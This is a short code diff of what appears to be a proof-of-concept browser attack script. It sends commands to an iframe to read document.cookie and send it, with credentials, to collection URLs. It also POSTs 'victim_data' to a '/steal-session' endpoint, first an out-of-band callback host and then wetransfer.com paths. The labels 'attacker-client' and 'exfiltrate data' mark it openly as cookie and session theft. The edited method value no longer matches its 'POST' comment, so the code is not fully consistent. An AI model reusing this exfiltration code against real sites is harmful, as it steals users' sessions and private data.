@@ -18,7 +18,7 @@
             try {
                 console.debug('[DEBUG] iframe loaded:', iframe.src);
                 // 2. Send command to exfiltrate data
-                const collectUrl = `https://tagging.wetransfer.com/collect?cookies=${encodeURIComponent(document.cookie)}`;
+                const collectUrl = `https://wetransfer.com/collect?cookies=${encodeURIComponent(document.cookie)}`;
                 const collectMsg = {
                     type: 1,
                     clientId: 'attacker-client',
@@ -29,7 +29,7 @@
                             method: 0,
                             credentials: 'include',
                             templates: {},
-                            processResponse: false
+                            processResponse: true
                         }
                     }
                 };
@@ -43,8 +43,8 @@
                     command: {
                         commandType: 0,
                         params: {
-                            url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/steal-session',
-                            method: 1, // POST
+                            url: 'https://wetransfer.com/steal-session',
+                            method: 0, // POST
                             body: 'victim_data=sensitive',
                             credentials: 'include'
                         }
